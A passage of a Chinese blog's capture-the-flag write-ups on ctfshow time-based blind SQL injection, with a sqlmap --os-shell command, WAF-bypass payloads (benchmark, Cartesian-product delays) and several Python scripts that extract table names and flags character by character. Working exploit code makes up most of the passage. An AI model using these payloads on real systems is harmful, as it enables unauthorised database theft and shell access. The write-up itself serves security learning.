class="string">&quot;ctfshow_user&quot;</span> --columns --dump</span><br></pre></td></tr></table></figure></div>

<p><strong>执行之后发现不在数据库中</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220821202454491.png"
                      alt="image-20220821202454491"
                ></p>
<p><strong>使用–os-shell来获取shell</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://99b165f7-12bb-4521-88a8-142179c10dd6.challenge.ctf.show/api/index.php --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=2aei120afjs82guplv4o6frefj;&quot;</span> --referer=ctf.show  --safe-url=<span class="string">&quot;http://99b165f7-12bb-4521-88a8-142179c10dd6.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq=1 --tamper=<span class="string">&quot;Koishi_base64AndSpace&quot;</span> --os-shell</span><br></pre></td></tr></table></figure></div>



<p><strong>成功之后就可以执行命令了，我们看看根目录的文件，发现有疑似flag的文件，于是我们接着cat看看，于是拿到flag</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220821203531154.png"
                      alt="image-20220821203531154"
                ></p>
<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><h2 id="214（整数型）"><a href="#214（整数型）" class="headerlink" title="214（整数型）"></a>214（整数型）</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220821210207735.png"
                      alt="image-20220821210207735"
                ></p>
<p>在首页的select.js中发现向&#x2F;api&#x2F;   post了两个参数，一个是ip，一个是debug</p>
<p><strong>经过手动测试，参数ip可以进行sql注入，如下会有延迟（注意修改一下url为 url&#x2F;api&#x2F;index.php ）：</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ip<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> if(substr((<span class="keyword">select</span> version()),<span class="number">0</span>,<span class="number">1</span>)<span class="operator">!=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">0</span>) <span class="operator">&amp;&amp;</span>debug<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220821210837336.png"
                      alt="image-20220821210837336"
                ></p>
<p><strong>经此发现ip这个盲注点，无任何过滤，和布尔盲注都差不多，简简单单写个脚本 ( 在向url传data的时候需要多加个参数 ) ok</strong></p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://81b0a990-674c-43d1-824d-691e83fed9ad.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆库名 informbtion_schema,test,mysql,performance_schema,czfshow_web</span></span><br><span class="line"><span class="comment"># payload = &quot;if(ascii(mid((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;,sleep(5),1)&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagx,ctfshow_info</span></span><br><span class="line"><span class="comment"># payload = &quot;if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(5),1)&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flaga,info,id,ip,cname</span></span><br><span class="line"><span class="comment"># payload = &quot;if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(5),1)&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;if(ascii(mid((select group_concat(flaga) from ctfshow_flagx),&#123;&#125;,1))&gt;&#123;&#125;,sleep(5),1)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_char</span>(<span class="params">index: <span class="built_in">int</span>, <span class="built_in">ascii</span>: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: payload.<span class="built_in">format</span>(index, <span class="built_in">ascii</span>),</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># requests.post 的 timeout参数作用是：设置延迟时间，若在设置的时间后访问未成功则报错</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _ = requests.post(url, data=data, timeout=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;天才琪露诺小姐正在努力查询中｡◕‿◕｡\n&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_char(i, p):</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\r[+] flag: <span class="subst">&#123;result&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n⑨:果然咱是天下第一聪明 (◍•ᴗ•◍)❤ &quot;</span>)</span><br></pre></td></tr></table></figure></div>



<h2 id="215（字符型）"><a href="#215（字符型）" class="headerlink" title="215（字符型）"></a>215（字符型）</h2><p>题目说是说的查询语句用了单引号，于是在上一题的payload的前加上1’ or 和最后加个# 就行了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220822170714632.png"
                      alt="image-20220822170714632"
                ></p>
<p><strong>看环境给的回显，发现确实sql查询是有单引号的，注入尝试也成功，说明没有任何过滤</strong></p>
<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a><strong>exp</strong></h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://18429070-826b-47e0-87b2-cde39e9c927f.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagxc,cthshow_info</span></span><br><span class="line"><span class="comment"># payload = &quot;koishi&#x27; or if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(10),1) #&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagaa,info,id,ip,cname</span></span><br><span class="line"><span class="comment"># payload = &quot;koishi&#x27; or if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(10),1) #&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;koishi&#x27; or if(ascii(mid((select flagaa from ctfshow_flagxc),&#123;&#125;,1))&gt;&#123;&#125;,sleep(4),1) #&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_char</span>(<span class="params">index: <span class="built_in">int</span>, <span class="built_in">ascii</span>: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: payload.<span class="built_in">format</span>(index, <span class="built_in">ascii</span>),</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># requests.post 的 timeout参数作用是：设置延迟时间，若在设置的时间后访问未成功则报错</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _ = requests.post(url, data=data, timeout=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;天才琪露诺小姐正在努力查询中｡◕‿◕｡\n&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_char(i, p):</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\r[+] flag: <span class="subst">&#123;result&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n⑨:果然咱是天下第一聪明 (◍•ᴗ•◍)❤ &quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>时间盲注有一定的网络环境要求，要是发现注入结果有问题，就适当修改延时时间和timeout的大小，条件良好的情况下，时间短跑得快</p>
<h2 id="216（对查询对象使用了带括号的函数）"><a href="#216（对查询对象使用了带括号的函数）" class="headerlink" title="216（对查询对象使用了带括号的函数）"></a>216（对查询对象使用了带括号的函数）</h2><p>题目给的查询方式</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查询语句</span></span><br><span class="line">where id = <span class="title function_ invoke__">from_base64</span>(<span class="variable">$id</span>);</span><br></pre></td></tr></table></figure></div>



<p>尝试注入语句</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ip<span class="operator">=</span><span class="string">&#x27;MQ==&#x27;</span>) <span class="keyword">or</span> if(substr((<span class="keyword">select</span> version()),<span class="number">0</span>,<span class="number">1</span>)<span class="operator">!=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">0</span>) #<span class="operator">&amp;&amp;</span>debug<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p>（ MQ&#x3D;&#x3D; 是1的base64）</p>
<p><strong>对于这种带括号的需要注意：</strong></p>
<p>1.闭合括号</p>
<p>2.参数要用引号（我开始就没注意到，就一直不成功，淦！）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220822172818156.png"
                      alt="image-20220822172818156"
                ></p>
<p><strong>修改一下之前的exp就能行了</strong></p>
<p><strong>这里不写了</strong></p>
<h2 id="217（sleep已经GG）"><a href="#217（sleep已经GG）" class="headerlink" title="217（sleep已经GG）"></a>217（sleep已经GG）</h2><p>查看过滤</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//屏蔽危险分子</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sleep/i&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure></div>

<p>之前一直都没管 php 的 preg_match 函数，这里对它的几个常见参数记录一下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/u 表示按unicode(utf-8)匹配（主要针对多字节比如汉字）</span><br><span class="line">/i 表示不区分大小写（如果表达式里面有 a， 那么 A 也是匹配对象）</span><br><span class="line">/s 表示将字符串视为单行来匹配</span><br></pre></td></tr></table></figure></div>

<p><strong>返回逻辑部分禁用了 sleep，还可以用 benchmark 和笛卡尔积。</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\2087645-20210825152632083-741400030.png"
                      alt="image-20210821190843466"
                ></p>
<p><strong>使用benchmark 函数去尝试注入时间(每个payload都最好单独测一下，这里只写flag那个)</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">ip=(<span class="keyword">if</span>(<span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">mid</span>((select <span class="title function_ invoke__">group_concat</span>(flagaabc) <span class="keyword">from</span> ctfshow_flagxccb),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">1</span>,<span class="title function_ invoke__">benchmark</span>(<span class="number">40000000</span>,<span class="string">&#x27;koishi&#x27;</span>=<span class="string">&#x27;Cirno&#x27;</span>),<span class="number">1</span>))&amp;debug=<span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<p>（因为个人癖好，这里的benchmark 里面使用的有字符串，如果引号被过滤的话，使用1&#x3D;1这种整数比较或者换成其他的可执行的语句都行）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220822202801278.png"
                      alt="image-20220822202801278"
                ></p>
<p><strong>执行一次大概需要2秒，我们就可以根据这个来时间盲注了</strong></p>
<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><p>本脚本是参考其他师傅写的，那位师傅的脚本费事太长了，于是我对其进行了修改</p>
<p>原本的 timeout为3， sleep为10 （因为他的benchmark 太费时了，10s左右），benchmark 为 <code>benchmark(8000000,md5(0x31))</code></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://77278e61-fbea-4a6d-87ce-b0067f5cbbc0.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagxccb,ctfshow_info</span></span><br><span class="line"><span class="comment"># payload = &quot;if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,benchmark(8000000,md5(0x31)),1)&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagaabc,info,id,ip,cname</span></span><br><span class="line"><span class="comment"># payload = &quot;if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,benchmark(8000000,md5(0x31)),1)&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;if(ascii(mid((select group_concat(flagaabc) from ctfshow_flagxccb),&#123;&#125;,1))&gt;&#123;&#125;,benchmark(40000000,&#x27;koishi&#x27;=&#x27;Cirno&#x27;),1)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_char</span>(<span class="params">index: <span class="built_in">int</span>, <span class="built_in">ascii</span>: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: payload.<span class="built_in">format</span>(index, <span class="built_in">ascii</span>),</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _ = requests.post(url, data=data, timeout=<span class="number">1.5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_char(i, p):</span><br><span class="line">            start = p</span><br><span class="line">            time.sleep(<span class="number">3</span>) <span class="comment"># benchmark 跑完大概需要 2s ，1.5s 超时后再让脚本停 8s，防止阻塞后全部超时影响时间盲注,导致结果出现问题</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line"></span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>



<p>由于这个东西比较吃网速，如果出现问题，适当延长sleep的时间长度</p>
<h2 id="218-219-sleep和benchmark被禁"><a href="#218-219-sleep和benchmark被禁" class="headerlink" title="218-219(sleep和benchmark被禁)"></a>218-219(sleep和benchmark被禁)</h2><p><strong>(219多过滤了rlike，和我们的笛卡尔积关系不大)</strong></p>
<p><strong>看题目过滤</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">where id = (<span class="variable">$id</span>);</span><br><span class="line">      </span><br><span class="line"><span class="comment">//屏蔽危险分子</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sleep|benchmark/i&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure></div>



<p><strong>使用笛卡尔积</strong></p>
<blockquote>
<p><a class="link"   href="https://cloud.tencent.com/developer/article/1601686" >SQL注入经验-大负荷注入 - 腾讯云开发者社区-腾讯云 (tencent.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>通过采用 1 个表 2 个列，或者 2 个列一个表，等等各种组合找出合适的延时的时间。</strong></p>
</blockquote>
<p>参考别人师傅写好的exp</p>
<h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><p><strong>经过测试，利用 <code>information_schema</code> 中的数据，一个 <code>columns</code> 和两个 <code>tables</code> 的笛卡尔积刚好能延时 6 秒左右，适合构造 payload。</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://af34bdbe-291d-4bad-b112-ca31adbcc85a.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagxc,ctfshow_info</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagaac</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;ascii(mid((select flagaac from ctfshow_flagxc),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p:<span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: <span class="string">f&quot;if(<span class="subst">&#123;p&#125;</span>,(select count(*) from information_schema.columns A,information_schema.tables B,information_schema.tables C),1) &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    time_s = time.time()</span><br><span class="line">    _ = requests.post(url=url,data=data)</span><br><span class="line">    time_e = time.time()</span><br><span class="line">    <span class="comment"># 改用手动计时防止多次没跑完的笛卡尔积叠加卡死影响注入使用之前那个timeout来报错返回true或false也行的捏</span></span><br><span class="line">    <span class="keyword">return</span> time_e-time_s &gt; <span class="number">4</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;少女折寿中: &quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start-end)==<span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        everage = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_payload(payload.<span class="built_in">format</span>(index, everage)):</span><br><span class="line">            start = everage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = everage</span><br><span class="line">    <span class="keyword">if</span> end&lt;start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\r flag is : <span class="subst">&#123;result&#125;</span>&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n⑨酱使命完成&quot;</span>)</span><br></pre></td></tr></table></figure></div>



<p><strong>亲自尝试也确实是6s</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220823150042653.png"
                      alt="image-20220823150042653"
                ></p>
<p><strong>payload</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ip<span class="operator">=</span>if(ascii(mid((<span class="keyword">select</span> flagaac <span class="keyword">from</span> ctfshow_flagxc),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">32</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns A,information_schema.tables B,information_schema.tables C),<span class="number">1</span>)<span class="operator">&amp;</span>debug<span class="operator">=</span><span class="number">0</span></span><br></pre></td></tr></table></figure></div>



<p>除了information_schema.columns 和 information_schema.table可以使用，同样information_schema.schemata也能使用m-，但是它的count数肯定不如前面那两个多，反正自己组合吧，我尝试了</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ip<span class="operator">=</span>if(ascii(mid((<span class="keyword">select</span> flagaac <span class="keyword">from</span> ctfshow_flagxc),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">32</span>,(<span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),<span class="number">1</span>)<span class="operator">&amp;</span>debug<span class="operator">=</span><span class="number">0</span></span><br></pre></td></tr></table></figure></div>



<p>延时大概是1.4s左右（这个就需要网速比较好才不会出问题，但跑起来比之前那个省较多时间（触发延时的时候比较短，总体节省3-4分钟吧）。但是时间短了，就一定一定要注意网络不要波动太大，不然老老实实用上面的那个吧），再加到G就是7s了，还不如上面的那个</p>
<p>也就只是改了一下payload，嘛，还是贴一下，方便复制粘贴（还是容易出错，毕竟时间太短了，假如某个时间网卡一下，flag就错了）</p>
<p>(还是建议用上面那个时间长一点的，这个就当拓展思维了，要是能凑出4s左右的应该也可以用。这个自己手动调整也能用)</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2ed44bf1-af80-4d14-886c-50ce08dda8f6.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagxc,ctfshow_info</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagaac</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;ascii(mid((select flagaac from ctfshow_flagxc),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p:<span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: <span class="string">f&quot;if(<span class="subst">&#123;p&#125;</span>,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1) &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    time_s = time.time()</span><br><span class="line">    _ = requests.post(url=url,data=data)</span><br><span class="line">    time_e = time.time()</span><br><span class="line">    <span class="comment"># 改用手动计时防止多次没跑完的笛卡尔积叠加卡死影响注入使用之前那个timeout来报错返回true或false也行的捏</span></span><br><span class="line">    <span class="keyword">return</span> time_e-time_s &gt; <span class="number">0.9</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#半自动，请自行调整result</span></span><br><span class="line">index = <span class="number">1</span> + <span class="built_in">len</span>(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;少女折寿中: &quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start-end)==<span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        everage = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_payload(payload.<span class="built_in">format</span>(index, everage)):</span><br><span class="line">            start = everage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = everage</span><br><span class="line">    <span class="keyword">if</span> end&lt;start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\r flag is : <span class="subst">&#123;result&#125;</span>&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span 